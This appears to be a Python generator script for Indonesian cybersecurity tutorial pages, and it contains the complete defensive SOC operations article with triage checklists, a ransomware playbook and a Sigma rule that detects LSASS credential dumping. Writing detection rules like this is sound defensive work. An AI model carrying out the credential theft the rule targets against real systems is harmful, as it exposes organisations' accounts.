#!/usr/bin/env python3
"""Generate 9 cybersecurity articles with 500+ lines each."""
import os

DIR = r"C:\Users\user\Documents\pribadi\web adsence\articles"

def hdr(title, desc, kw, diff, diffl, time, subtitle, section="Keamanan"):
    return f'''<!DOCTYPE html>
<html lang="id" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="../css/style.css?v=13.3">
  <link rel="stylesheet" href="../css/mobile-quick-menu.css">
  <title>{title} | BeebaneLabs</title>
  <meta name="description" content="{desc}">
  <meta name="keywords" content="{kw}">
  <meta name="author" content="BeebaneLabs">
  <meta property="article:published_time" content="2026-06-29">
  <meta property="article:section" content="{section}">
  <meta property="og:title" content="{title} - BeebaneLabs">
  <meta property="og:description" content="{desc}">
  <meta property="og:type" content="article">
  <meta property="og:image" content="../images/logo_beebane.png">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐝</text></svg>">
<script>
(function(){{var src='https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2122797411859663';function loadAds(){{if(window._adsLoaded)return;window._adsLoaded=true;var s=document.createElement('script');s.async=true;s.crossOrigin='anonymous';s.src=src;document.head.appendChild(s);['scroll','mousedown','touchstart','keydown'].forEach(function(e){{document.removeEventListener(e,loadAds,{{passive:true}})}})}}['scroll','mousedown','touchstart','keydown'].forEach(function(e){{document.addEventListener(e,loadAds,{{passive:true,once:true}})}});setTimeout(loadAds,5000)}})();
</script>
</head>
<body>
  <noscript><style>.article-content{{display:block!important}}</style></noscript>
  <a href="#main-content" class="skip-link">Skip ke konten utama</a>
  <div class="reading-progress-bar" id="readingProgress"></div>
  <nav class="navbar" id="navbar"><div class="navbar-inner"><a href="../index.html" class="navbar-brand"><img src="../images/logo_beebane.png" alt="BeebaneLabs" class="brand-logo" width="40" height="22"></a><ul class="navbar-links" id="navLinks"><li><a href="../index.html">Beranda</a></li><li><a href="../kategori.html">Kategori</a></li><li><a href="../about.html">Tentang</a></li><li><a href="../pricing.html">Harga</a></li></ul><div class="navbar-search" id="searchTrigger"><span>Cari tutorial...</span></div><div id="authNavArea"></div><button class="menu-toggle" id="menuToggle" aria-label="Toggle menu"><span></span><span></span><span></span></button></div></nav>
  <div class="search-overlay" id="searchOverlay"><button class="search-close-btn" onclick="document.getElementById('searchOverlay').classList.remove('active')">&times;</button><div class="search-box"><div class="search-input-wrapper"><input type="text" id="searchInput" placeholder="Cari tutorial..."></div><div class="search-results" id="searchResults"><div class="search-hint">Ketik untuk mencari</div></div></div></div>
  <section class="article-hero"><div class="container"><div class="breadcrumb"><a href="../index.html">Beranda</a><span class="separator">/</span><a href="../index.html#categories">Keamanan</a><span class="separator">/</span><span class="current">{title}</span></div><span class="category-tag">Keamanan</span><h1>{title}</h1><p class="article-subtitle">{subtitle}</p><div class="article-meta"><span>📅 29 Juni 2026</span><span>📖 {time} baca</span><span class="difficulty {diff}">{diffl}</span></div></div></section>
  <div class="container"><div class="ad-slot ad-slot-wide"></div></div>
  <article class="article-content" id="main-content"><div class="container">
'''

def ftr():
    return '''  </div></article>
  <script src="../js/app.js?v=9.5"></script>
<script>if('serviceWorker' in navigator){window.addEventListener('load',()=>{navigator.serviceWorker.register('/sw.js').catch(()=>{})})}</script>
</body>
</html>'''

def toc(items):
    s = '    <div class="info-box info"><div class="info-box-title">📋 Daftar Isi</div><ol>\n'
    for tid, tname in items:
        s += f'      <li><a href="#{tid}">{tname}</a></li>\n'
    s += '    </ol></div>\n'
    return s

def quiz(questions, num):
    s = f'      <h2 id="quiz">{num}. Quiz Pemahaman</h2>\n'
    s += '      <div class="quiz-container">\n'
    for i, q in enumerate(questions, 1):
        s += f'        <div class="quiz-question" data-correct="{q["c"]}">\n'
        s += f'          <p><strong>{q["q"]}</strong></p>\n'
        for j, opt in enumerate(q["o"]):
            s += f'          <label><input type="radio" name="q{i}" value="{j}"> {opt}</label>\n'
        s += '        </div>\n'
    s += '        <button class="quiz-submit" onclick="checkQuiz(this)">Periksa Jawaban</button>\n'
    s += '        <div class="quiz-result"></div>\n'
    s += '      </div>\n'
    return s

def summary_box(points):
    s = '      <h3>Rangkuman</h3>\n'
    s += '      <div class="info-box info"><div class="info-box-title">📝 Poin Penting</div><ul>\n'
    for p in points:
        s += f'        <li><strong>{p[0]}</strong> — {p[1]}</li>\n'
    s += '      </ul></div>\n'
    return s

articles = [
    # 1. SOC Operations
    {
        "f": "soc-operations.html", "t": "SOC Operations dan Incident Triage",
        "d": "Pelajari SOC Operations dan Incident Triage: struktur tim SOC, workflow monitoring, triage framework, alert prioritization, dan incident response.",
        "k": "SOC Operations, Incident Triage, Security Operations Center, Alert Prioritization, Incident Response",
        "df": "menengah", "dl": "Menengah", "tm": "15 menit",
        "st": "Panduan lengkap membangun dan mengoperasikan Security Operations Center — dari struktur tim, monitoring, triage, hingga incident response",
        "toc": [("pengenalan","Pengenalan SOC"),("struktur","Struktur Tim SOC"),("workflow","Monitoring Workflow"),("triage","Incident Triage"),("alert","Alert Prioritization"),("siem","SIEM Integration"),("ir","Incident Response"),("metrics","SOC Metrics"),("soar","SOAR & Automation"),("quiz","Quiz")],
    },
    # 2. Wireless Pentest
    {
        "f": "wireless-penetration-testing.html", "t": "Wireless Penetration Testing",
        "d": "Pelajari wireless penetration testing: WiFi security, WPA/WPA2/WPA3 cracking, rogue AP detection, Evil Twin, dan wireless hardening.",
        "k": "Wireless Penetration Testing, WiFi Security, WPA2 Cracking, Aircrack-ng, Evil Twin",
        "df": "lanjut", "dl": "Lanjut", "tm": "16 menit",
        "st": "Panduan lengkap wireless penetration testing — reconnaissance, WiFi cracking, Evil Twin, rogue AP, hingga wireless IDS",
        "toc": [("pengenalan","Pengenalan"),("tools","Tools & Setup"),("recon","Reconnaissance"),("wep","WEP Cracking"),("wpa","WPA/WPA2 Cracking"),("wpa3","WPA3 Security"),("evil","Evil Twin"),("defense","Defense & Hardening"),("quiz","Quiz")],
    },
    # 3. API Security
    {
        "f": "api-security-testing.html", "t": "API Security Testing",
        "d": "Pelajari API Security Testing: OWASP API Top 10, REST API vulnerabilities, JWT attacks, injection, IDOR, dan API security best practices.",
        "k": "API Security Testing, OWASP API Top 10, REST Security, JWT Security, IDOR",
        "df": "lanjut", "dl": "Lanjut", "tm": "15 menit",
        "st": "Panduan lengkap API security testing — OWASP API Top 10, authentication, injection, IDOR/BOLA, rate limiting, dan hardening",
        "toc": [("pengenalan","Pengenalan"),("owasp","OWASP API Top 10"),("recon","API Reconnaissance"),("auth","Auth Testing"),("injection","Injection Attacks"),("idor","IDOR & BOLA"),("rate","Rate Limiting"),("best","Best Practices"),("quiz","Quiz")],
    },
    # 4. Container Security
    {
        "f": "container-security.html", "t": "Container Security Best Practices",
        "d": "Pelajari Container Security: Docker hardening, Kubernetes security, image scanning, runtime protection, dan container compliance.",
        "k": "Container Security, Docker Security, Kubernetes Security, Image Scanning, Runtime Protection",
        "df": "lanjut", "dl": "Lanjut", "tm": "15 menit",
        "st": "Panduan lengkap container security — Docker hardening, image scanning, Kubernetes RBAC, runtime protection, hingga compliance",
        "toc": [("pengenalan","Pengenalan"),("dockerfile","Dockerfile Security"),("scanning","Image Scanning"),("runtime","Runtime Security"),("kubernetes","Kubernetes Security"),("network","Network Security"),("secrets","Secrets Management"),("compliance","Compliance & Audit"),("quiz","Quiz")],
    },
    # 5. Mobile Security
    {
        "f": "mobile-security-testing.html", "t": "Mobile App Security Testing",
        "d": "Pelajari Mobile App Security Testing: OWASP Mobile Top 10, Android/iOS pentesting, reverse engineering, SSL pinning bypass, dan mobile forensics.",
        "k": "Mobile Security Testing, OWASP Mobile, Android Security, iOS Security, Mobile Pentesting",
        "df": "lanjut", "dl": "Lanjut", "tm": "16 menit",
        "st": "Panduan lengkap mobile app security testing — OWASP Mobile Top 10, static analysis, dynamic analysis, reverse engineering Android dan iOS",
        "toc": [("pengenalan","Pengenalan"),("owasp","OWASP Mobile Top 10"),("android","Android Setup"),("static","Static Analysis"),("dynamic","Dynamic Analysis"),("ios","iOS Testing"),("network","Network Analysis"),("automation","Automation"),("quiz","Quiz")],
    },
    # 6. Social Engineering
    {
        "f": "social-engineering-awareness.html", "t": "Social Engineering Defense",
        "d": "Pelajari Social Engineering Defense: phishing awareness, pretexting, baiting, tailgating, BEC, dan security awareness training.",
        "k": "Social Engineering, Phishing Awareness, Pretexting, Security Awareness, Human Firewall",
        "df": "menengah", "dl": "Menengah", "tm": "14 menit",
        "st": "Panduan lengkap mengenali dan melawan social engineering — phishing, pretexting, baiting, tailgating, BEC, dan budaya keamanan",
        "toc": [("pengenalan","Pengenalan"),("phishing","Phishing"),("pretexting","Pretexting"),("baiting","Baiting & QPQ"),("physical","Physical Attack"),("bec","Spear Phishing & BEC"),("defense","Defense Strategy"),("training","Security Training"),("quiz","Quiz")],
    },
    # 7. Cloud Security Posture
    {
        "f": "cloud-security-posture.html", "t": "Cloud Security Posture Management",
        "d": "Pelajari CSPM: cloud misconfiguration detection, compliance monitoring, multi-cloud security, IaC scanning, dan automated remediation.",
        "k": "CSPM, Cloud Security Posture, Cloud Misconfiguration, AWS Security, Azure Security, GCP Security",
        "df": "lanjut", "dl": "Lanjut", "tm": "15 menit",
        "st": "Panduan lengkap CSPM — deteksi misconfiguration, compliance monitoring, multi-cloud security, IaC scanning, dan remediation otomatis",
        "toc": [("pengenalan","Pengenalan"),("misconfig","Common Misconfigurations"),("aws","AWS Security"),("azure","Azure Security"),("gcp","GCP Security"),("iac","IaC Security"),("compliance","Compliance"),("tools","CSPM Tools"),("quiz","Quiz")],
    },
    # 8. Threat Hunting
    {
        "f": "threat-hunting-techniques.html", "t": "Threat Hunting Techniques",
        "d": "Pelajari Threat Hunting: hypothesis-driven hunting, MITRE ATT&CK mapping, IOC hunting, behavioral analytics, dan hunting maturity model.",
        "k": "Threat Hunting, MITRE ATT&CK, IOC Hunting, Behavioral Analytics, Proactive Security",
        "df": "lanjut", "dl": "Lanjut", "tm": "16 menit",
        "st": "Panduan lengkap threat hunting — hypothesis-driven approach, MITRE ATT&CK, IOC/IOA hunting, behavioral analytics, dan hunting program",
        "toc": [("pengenalan","Pengenalan"),("hypothesis","Hypothesis-Driven"),("mitre","MITRE ATT&CK"),("ioc","IOC Hunting"),("behavioral","Behavioral Analytics"),("techniques","Hunting Techniques"),("tools","Hunting Tools"),("maturity","Maturity Model"),("quiz","Quiz")],
    },
    # 9. Zero Trust
    {
        "f": "zero-trust-implementation.html", "t": "Zero Trust Architecture Implementation",
        "d": "Pelajari Zero Trust Architecture: microsegmentation, identity verification, least privilege, SASE/ZTNA, dan implementation roadmap.",
        "k": "Zero Trust, Microsegmentation, Identity Verification, SASE, ZTNA",
        "df": "menengah", "dl": "Menengah", "tm": "15 menit",
        "st": "Panduan lengkap implementasi Zero Trust Architecture — prinsip, identity-centric security, microsegmentation, SASE/ZTNA, dan roadmap",
        "toc": [("pengenalan","Pengenalan"),("prinsip","Prinsip Zero Trust"),("identity","Identity-Centric"),("microseg","Microsegmentation"),("ztna","ZTNA"),("sase","SASE Architecture"),("roadmap","Implementation Roadmap"),("vendors","Technology & Vendors"),("quiz","Quiz")],
    },
]

# ============================================================
# Article body content - each article gets multiple sections
# with code blocks, tables, diagrams to ensure 500+ lines
# ============================================================

bodies = {}

# ---- 1. SOC Operations ----
bodies["soc-operations.html"] = """
      <h2 id="pengenalan">1. Pengenalan Security Operations Center</h2>
      <p><strong>Security Operations Center (SOC)</strong> adalah pusat komando keamanan siber yang beroperasi 24/7 untuk memantau, mendeteksi, menganalisis, dan merespons insiden keamanan secara real-time. SOC menjadi garda terdepan pertahanan organisasi terhadap serangan siber yang semakin canggih.</p>
      <p>Di era di mana serangan siber terjadi setiap 39 detik, memiliki SOC yang efektif bukan lagi kemewahan tetapi kebutuhan. SOC memungkinkan organisasi mendeteksi ancaman sebelum menyebabkan kerusakan signifikan, merespons insiden dalam hitungan menit, dan memenuhi persyaratan compliance seperti PCI DSS, HIPAA, dan ISO 27001.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Struktur dan fungsi tim SOC</li>
        <li>Workflow monitoring dan alerting 24/7</li>
        <li>Incident triage dan prioritisasi severity</li>
        <li>Integration dengan SIEM tools</li>
        <li>Incident response dan remediation</li>
        <li>SOAR dan automasi proses keamanan</li>
      </ul></div>
      <h3>SOC Maturity Levels</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: SOC Maturity Model</div>
<pre>
┌─────────────────────────────────────────────────────────────┐
│                    SOC MATURITY LEVELS                        │
│                                                              │
│  Level 1: Perimeter Security                                 │
│  ├── Firewall, IDS/IPS                                       │
│  └── Basic log monitoring                                    │
│                                                              │
│  Level 2: Log Management &amp; SIEM                              │
│  ├── Centralized logging                                     │
│  ├── SIEM deployment                                         │
│  └── Basic correlation rules                                 │
│                                                              │
│  Level 3: Threat Detection &amp; Response                        │
│  ├── Advanced analytics                                      │
│  ├── Threat intelligence integration                         │
│  └── Incident response procedures                            │
│                                                              │
│  Level 4: Proactive Hunting                                  │
│  ├── Threat hunting teams                                    │
│  ├── Red team exercises                                      │
│  └── Behavioral analytics                                    │
│                                                              │
│  Level 5: Adaptive &amp; Autonomous                              │
│  ├── AI/ML-powered detection                                 │
│  ├── Automated response (SOAR)                               │
│  └── Continuous improvement                                  │
└─────────────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="struktur">2. Struktur Tim SOC</h2>
      <p>Tim SOC terdiri dari beberapa level analis dengan tanggung jawab berbeda. Struktur tiered model memastikan insiden ditangani oleh personel dengan keahlian sesuai.</p>
      <table class="net-table"><thead><tr><th>Level</th><th>Peran</th><th>Tanggung Jawab</th></tr></thead><tbody>
        <tr><td><strong>Tier 1 — L1</strong></td><td>Triage Analyst</td><td>Monitoring alert, filter false positive, eskalasi insiden</td></tr>
        <tr><td><strong>Tier 2 — L2</strong></td><td>Incident Responder</td><td>Analisis mendalam, investigasi, containment</td></tr>
        <tr><td><strong>Tier 3 — L3</strong></td><td>Threat Hunter</td><td>Proactive hunting, malware analysis, forensik</td></tr>
        <tr><td><strong>Tier 4</strong></td><td>SOC Manager</td><td>Manajemen tim, reporting, strategi keamanan</td></tr>
      </tbody></table>
      <h3>Tier 1 — Triage Analyst</h3>
      <p>Analyst L1 adalah lini pertama pertahanan. Mereka memantau dashboard SIEM, melakukan triage terhadap alert, dan memutuskan apakah perlu eskalasi ke L2. Kemampuan yang dibutuhkan meliputi pemahaman dasar networking, OS, dan keamanan siber.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Checklist — Triage Alert</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Checklist Triage Alert — Tier 1 Analyst
# =============================================

# 1. Verifikasi Alert
#    - Apakah alert valid atau false positive?
#    - Apakah ada konteks tambahan di log?
#    - Apakah ada korelasi dengan alert lain?

# 2. Enrichment Data
#    - Cek IP address di threat intelligence
#    - Verifikasi user yang terlibat
#    - Cek aset yang terdampak

# Contoh: Mengecek IP di abuse.ch
curl -s "https://threatfox-api.abuse.ch/api/v1/" \\
  -d '{"query": "search_ioc", "search_term": "192.168.1.100"}'

# Contoh: Lookup domain di VirusTotal
curl --request GET \\
  --url "https://www.virustotal.com/api/v3/domains/malicious.com" \\
  --header "x-apikey: YOUR_API_KEY"

# 3. Klasifikasi Severity
#    - Critical: Active exploitation, data breach
#    - High: Successful unauthorized access
#    - Medium: Suspicious activity, policy violation
#    - Low: Informational, reconnaissance

# 4. Dokumentasi &amp; Eskalasi
#    - Isi template insiden
#    - Attach semua evidence
#    - Eskalasi ke L2 jika severity &gt;= Medium</pre>
      </div>

      <h2 id="workflow">3. SOC Monitoring Workflow</h2>
      <p>Workflow SOC yang efektif mengikuti siklus berulang: <strong>Detect → Triage → Investigate → Respond → Recover → Lessons Learned</strong>. Setiap tahap memiliki prosedur dan tools yang terstandarisasi.</p>
      <h3>Data Sources yang Dimonitor</h3>
      <ul>
        <li><strong>Network Logs</strong> — Firewall, router, switch, IDS/IPS</li>
        <li><strong>Endpoint Logs</strong> — EDR, antivirus, OS event logs</li>
        <li><strong>Application Logs</strong> — Web server, database, authentication</li>
        <li><strong>Cloud Logs</strong> — AWS CloudTrail, Azure Activity Log, GCP Audit</li>
        <li><strong>Email Logs</strong> — Email gateway, anti-spam, DMARC reports</li>
        <li><strong>Identity Logs</strong> — Active Directory, LDAP, SSO, MFA</li>
      </ul>
      <div class="code-block"><div class="code-header"><span class="code-lang">Template — Shift Handover</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Template: SOC Shift Handover
# =============================================

# Tanggal &amp; Waktu: 2024-01-15 08:00 WIB
# Shift Sebelumnya: Night Shift (00:00 - 08:00)
# Analis: John Doe

# RINGKASAN SHIFT
# =================================================
# Total Alert Masuk: 342
# Alert Dismissed (FP): 298
# Alert Open (menunggu investigasi): 38
# Insiden Dikonfirmasi: 6

# INSIDEN AKTIF (belum resolved)
# =================================================
# INC-2024-0142: Brute force SSH dari 203.0.113.50
#   Status: Under investigation (L2)
#   Aksi: IP sudah di-block di firewall
#   Next: Cek apakah ada kompromi lain

# INC-2024-0145: Data exfiltration indicator
#   Status: Containment done, eradication pending
#   Aksi: Host WS-FINANCE-05 diisolasi dari network
#   Next: Full disk imaging dan malware analysis

# ALERT MENINGKAT
# =================================================
# Phishing email meningkat 300% — campaign baru
# Brute force ke VPN portal dari 3 IP berbeda
# Unusual DNS queries dari server HR

# ACTION ITEMS UNTUK SHIFT BERIKUTNYA
# =================================================
# 1. Follow up INC-2024-0142 dan 0145
# 2. Monitor phishing campaign — update email rules
# 3. Review VPN access logs 24 jam terakhir
# 4. Update threat intel feeds</pre>
      </div>

      <h2 id="triage">4. Incident Triage Framework</h2>
      <p>Triage adalah proses memutuskan prioritas dan urgensi sebuah alert. Framework yang baik mengurangi waktu respon dan memastikan sumber daya teralokasi tepat.</p>
      <h3>Severity Matrix</h3>
      <table class="net-table"><thead><tr><th>Severity</th><th>Dampak</th><th>Response Time</th><th>Contoh</th></tr></thead><tbody>
        <tr><td><strong>Critical (P1)</strong></td><td>Bisnis terhenti, data breach</td><td>&lt; 15 menit</td><td>Active ransomware, data exfiltration</td></tr>
        <tr><td><strong>High (P2)</strong></td><td>Dampak signifikan</td><td>&lt; 1 jam</td><td>Unauthorized admin access, malware</td></tr>
        <tr><td><strong>Medium (P3)</strong></td><td>Potensi risiko</td><td>&lt; 4 jam</td><td>Suspicious process, policy violation</td></tr>
        <tr><td><strong>Low (P4)</strong></td><td>Informatif</td><td>&lt; 24 jam</td><td>Failed login, port scan</td></tr>
      </tbody></table>
      <h3>Triage Decision Tree</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Triage Decision Tree</div>
<pre>
┌───────────────────────────────────────┐
│         ALERT MASUK                    │
└─────────────┬─────────────────────────┘
              ▼
┌───────────────────────────────────────┐
│  Apakah ini FALSE POSITIVE?            │
│  (known benign, scheduled scan)        │
└──────┬────────────────┬───────────────┘
       ▼ YES            ▼ NO
┌──────────────┐  ┌─────────────────────┐
│  Dismiss &amp;   │  │  Apakah target ASET │
│  Document    │  │  KRITIS?             │
└──────────────┘  └──┬───────────┬──────┘
                     ▼ YES       ▼ NO
              ┌────────────┐ ┌─────────────┐
              │  P1/P2     │ │  Apakah ada │
              │  Immediate │ │  KOMPROMI?  │
              │  Response  │ │  (exec, C2) │
              └────────────┘ └──┬──────┬───┘
                               ▼ YES  ▼ NO
                        ┌──────────┐ ┌───────┐
                        │  P2      │ │  P3/P4│
                        │  Escalate│ │  Log &amp;│
                        │  to L2   │ │  Track│
                        └──────────┘ └───────┘
</pre>
      </div>
      <div class="code-block"><div class="code-header"><span class="code-lang">SIEM Alert — Brute Force Detection</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Contoh Alert: Brute Force Detection
# =============================================

# Alert Details:
# Name: Multiple Failed Login Attempts
# Source: Active Directory
# Timestamp: 2024-01-15 03:22:45 WIB
# Count: 47 failed attempts in 5 minutes
# Target: DC-FINANCE-01 (Domain Controller)
# Source IP: 10.10.50.23 (Workstation HR)
# Account: administrator

# TRIAGE ANALYSIS
# =================================================

# Step 1: Verify alert validity
# - Check if IP belongs to legitimate scanner
# - Verify with asset inventory
# - Check if there's a maintenance window

# Step 2: Context enrichment
# - User "administrator" is sensitive account
# - DC-FINANCE-01 is critical asset
# - Source workstation belongs to HR department
# - Time 03:22 is outside business hours

# Step 3: Severity determination
# - Target: Critical (Domain Controller)
# - Account: Critical (administrator)
# - Time: Suspicious (after hours)
# - Volume: High (47 attempts)
# => SEVERITY: P1 — CRITICAL

# Step 4: Immediate actions
# 1. Block source IP at firewall
netsh advfirewall firewall add rule name="BLOCK-BF" \\
  dir=in action=block remoteip=10.10.50.23

# 2. Disable compromised account
net user administrator /active:no

# 3. Check for successful login
# Query: Did any login succeed from this IP?
index=windows EventCode=4624 IpAddress="10.10.50.23"
  Account_Name="administrator"

# 4. Isolate affected workstation
# (via EDR or network segmentation)</pre>
      </div>

      <h2 id="alert">5. Alert Prioritization</h2>
      <p>Alert fatigue adalah tantangan terbesar SOC. Rata-rata SOC menerima 11,000 alert per hari, dan hanya 1-5% yang memerlukan investigasi nyata.</p>
      <h3>Strategi Mengurangi Alert Fatigue</h3>
      <ul>
        <li><strong>Tune correlation rules</strong> — Hapus atau modifikasi rule yang menghasilkan terlalu banyak false positive</li>
        <li><strong>Whitelist known good</strong> — Identifikasi dan whitelist aktivitas benign yang berulang</li>
        <li><strong>Context enrichment</strong> — Tambahkan konteks seperti asset criticality, user role, dan threat intel</li>
        <li><strong>Risk scoring</strong> — Hitung risk score berdasarkan multiple faktor untuk prioritisasi otomatis</li>
      </ul>
      <div class="code-block"><div class="code-header"><span class="code-lang">Python — Risk Scoring Engine</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Risk Scoring Engine untuk Alert Prioritization
# =============================================

class AlertRiskScorer:
    def __init__(self):
        self.asset_weights = {
            "domain_controller": 10,
            "database_server": 9,
            "web_server": 7,
            "workstation": 4,
            "printer": 1
        }
        self.time_multiplier = {
            "business_hours": 1.0,
            "after_hours": 1.3,
            "holiday": 1.5
        }

    def calculate_score(self, alert):
        base_score = 0
        # Factor 1: Asset Criticality (0-30)
        asset_type = alert.get("asset_type", "workstation")
        base_score += self.asset_weights.get(asset_type, 4) * 3
        # Factor 2: Threat Intel Match (0-25)
        if alert.get("threat_intel_match"):
            base_score += 25
        # Factor 3: Attack Confidence (0-20)
        confidence = alert.get("confidence", 0.5)
        base_score += int(confidence * 20)
        # Factor 4: User Risk (0-15)
        if alert.get("privileged_user"):
            base_score += 15
        else:
            base_score += 5
        # Factor 5: Time-based (multiplier)
        time_factor = self.time_multiplier.get(
            alert.get("time_category"), 1.0)
        base_score = int(base_score * time_factor)
        return min(max(base_score, 0), 100)

    def get_priority(self, score):
        if score &gt;= 80: return "P1 — Critical"
        if score &gt;= 60: return "P2 — High"
        if score &gt;= 40: return "P3 — Medium"
        return "P4 — Low"

# Contoh penggunaan
scorer = AlertRiskScorer()
alert = {
    "asset_type": "domain_controller",
    "threat_intel_match": True,
    "confidence": 0.85,
    "privileged_user": True,
    "time_category": "after_hours"
}
score = scorer.calculate_score(alert)
priority = scorer.get_priority(score)
print(f"Risk Score: {score}/100 — {priority}")
# Output: Risk Score: 97/100 — P1 — Critical</pre>
      </div>

      <h2 id="siem">6. SIEM Integration</h2>
      <p>SIEM adalah jantung operasi SOC. Integrasi yang baik memastikan deteksi komprehensif dari semua sumber data.</p>
      <h3>Contoh Correlation Rule</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Sigma Rule — Credential Dumping</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Sigma Rule: Credential Dumping Detection
# =============================================
title: Credential Dumping via LSASS Access
id: a1234567-89ab-cdef-0123-456789abcdef
status: production
description: Detects suspicious access to LSASS process

logsource:
  category: process_access
  product: windows

detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1438'
  filter:
    SourceImage|endswith:
      - '\\wmiprvse.exe'
      - '\\taskmgr.exe'
  condition: selection and not filter

falsepositives:
  - Legitimate security tools
  - System processes

level: high
tags:
  - attack.credential_access
  - attack.t1003.001</pre>
      </div>

      <h2 id="ir">7. Incident Response</h2>
      <p>Incident Response (IR) adalah proses terstruktur untuk menangani insiden keamanan. Framework NIST SP 800-61 mendefinisikan 4 fase utama: Preparation, Detection &amp; Analysis, Containment Eradication Recovery, dan Post-Incident Activity.</p>
      <h3>IR Playbook — Ransomware</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">IR Playbook — Ransomware</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# INCIDENT RESPONSE PLAYBOOK: RANSOMWARE
# =============================================

# PHASE 1: DETECTION &amp; TRIAGE (0-30 menit)
# =================================================
# 1. Identifikasi indikator ransomware:
#    - Mass file extension changes
#    - Ransom note files appearing
#    - Unusual process execution
#    - Volume shadow copy deletion
#    - High CPU/disk I/O

# 2. Validasi alert:
#    - Verify file encryption evidence
#    - Check for ransom note content
#    - Identify ransomware variant (ID Ransomware)

# 3. Severity: P1 — CRITICAL

# PHASE 2: CONTAINMENT (30 menit - 2 jam)
# =================================================
# 1. Network isolation:
#    - Disconnect affected hosts from network
#    - Block lateral movement paths
#    - Isolate network segments

# 2. Account security:
#    - Force password reset for compromised accounts
#    - Disable suspicious service accounts
#    - Review and revoke VPN access

# 3. Evidence preservation:
#    - Capture memory dump
#    - Image affected systems
#    - Collect logs from all sources
#    - Document timeline

# PHASE 3: ERADICATION (2-24 jam)
# =================================================
# 1. Malware removal:
#    - Identify all affected systems
#    - Remove malware artifacts
#    - Patch exploited vulnerabilities

# 2. Root cause analysis:
#    - Initial infection vector
#    - Privilege escalation path
#    - Lateral movement methods

# PHASE 4: RECOVERY (1-7 hari)
# =================================================
# 1. System restoration:
#    - Restore from clean backups
#    - Verify system integrity
#    - Rebuild compromised systems

# 2. Monitoring:
#    - Enhanced monitoring for 30 days
#    - Watch for re-infection indicators

# PHASE 5: LESSONS LEARNED (7-14 hari)
# =================================================
# 1. Post-incident review meeting
# 2. Update detection rules
# 3. Improve security controls
# 4. Update this playbook</pre>
      </div>

      <h2 id="metrics">8. SOC Metrics &amp; KPI</h2>
      <p>Mengukur kinerja SOC sangat penting untuk perbaikan berkelanjutan dan membuktikan nilai investasi keamanan.</p>
      <table class="net-table"><thead><tr><th>KPI</th><th>Deskripsi</th><th>Target</th></tr></thead><tbody>
        <tr><td><strong>MTTD</strong></td><td>Mean Time to Detect</td><td>&lt; 1 jam</td></tr>
        <tr><td><strong>MTTR</strong></td><td>Mean Time to Respond</td><td>&lt; 4 jam</td></tr>
        <tr><td><strong>MTTC</strong></td><td>Mean Time to Contain</td><td>&lt; 8 jam</td></tr>
        <tr><td><strong>False Positive Rate</strong></td><td>% alert yang ternyata FP</td><td>&lt; 50%</td></tr>
        <tr><td><strong>Coverage</strong></td><td>% MITRE ATT&CK yang termonitor</td><td>&gt; 70%</td></tr>
        <tr><td><strong>Escalation Rate</strong></td><td>% alert yang perlu eskalasi</td><td>5-15%</td></tr>
      </tbody></table>
      <div class="info-box info"><div class="info-box-title">💡 Tips</div>
        <p>Fokus pada MTTD dan MTTR sebagai metrik utama. Kedua metrik ini langsung menggambarkan efektivitas SOC dalam mendeteksi dan merespons ancaman. Targetkan improvement 10-20% setiap quarter.</p>
      </div>

      <h2 id="soar">9. SOAR &amp; Automation</h2>
      <p><strong>SOAR (Security Orchestration, Automation, and Response)</strong> memungkinkan SOC mengotomasi tugas repetitif sehingga analis fokus pada analisis tingkat tinggi.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Python — SOAR Phishing Playbook</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# SOAR Playbook: Automated Phishing Response
# =============================================

class PhishingPlaybook:
    def __init__(self, siem, email, edr):
        self.siem = siem
        self.email = email
        self.edr = edr

    def execute(self, alert):
        # Step 1: Extract IOCs
        iocs = self.extract_iocs(alert["email_data"])
        # Step 2: Threat intel lookup
        ti = self.threat_intel_lookup(iocs)
        malicious_score = ti.get("score", 0)

        if malicious_score &gt; 70:
            # Step 3a: Auto remediate
            self.quarantine_email(alert["msg_id"])
            self.block_sender(alert["sender"])
            self.block_urls(iocs["urls"])
            # Step 4: Check link clicks
            affected = self.check_url_clicks(iocs["urls"])
            if affected:
                self.isolate_endpoints(affected)
                self.reset_passwords(affected)
            return {"action": "auto_remediated"}
        else:
            # Step 3b: Escalate to analyst
            self.create_ticket(alert, ti)
            return {"action": "escalated"}

    def extract_iocs(self, email_data):
        import re
        urls = re.findall(
            r'https?://[^\\s&lt;&gt;"]+', email_data.get("body", ""))
        return {
            "sender": email_data.get("from"),
            "subject": email_data.get("subject"),
            "urls": urls,
            "attachments": email_data.get("attachments", [])
        }</pre>
      </div>
      <div class="warning-box"><div class="info-box-title">⚠️ Catatan Penting</div>
        <p>Otomasi tidak menggantikan analis manusia. Selalu gunakan human-in-the-loop untuk keputusan high-impact seperti isolasi sistem produksi atau blocking IP range. Otomasi terbaik untuk enrichment, ticketing, dan remediation low-risk.</p>
      </div>
"""

# ---- 2. Wireless Pentest ----
bodies["wireless-penetration-testing.html"] = """
      <h2 id="pengenalan">1. Pengenalan Wireless Penetration Testing</h2>
